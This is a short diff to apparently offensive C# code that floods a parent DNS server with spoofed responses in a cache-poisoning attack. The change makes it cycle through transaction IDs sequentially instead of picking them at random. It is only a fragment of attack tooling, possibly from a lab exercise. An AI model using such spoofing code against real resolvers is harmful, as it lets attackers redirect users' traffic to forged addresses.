@@ -216,9 +216,10 @@ namespace DnsCache
                 Thread.Sleep(timeLeft);
                 var timeStart = DateTime.Now;
                 Console.WriteLine("[!]: Attack started!");
+                ushort i = 0;
                 while ((DateTime.Now - timeStart).TotalSeconds < 3)
                 {
-                    dns.SendDnsResponseTo(dns.ParentServer, (ushort)Rnd.Next(1, 65536), new[] { request }, new[] { answer }, null, new[] { answer });
+                    dns.SendDnsResponseTo(dns.ParentServer, i++/*(ushort)Rnd.Next(1, 65536)*/, new[] { request }, new[] { answer }, null, new[] { answer });
                 }
                 Console.WriteLine("[!]: Attack finished!");
             });
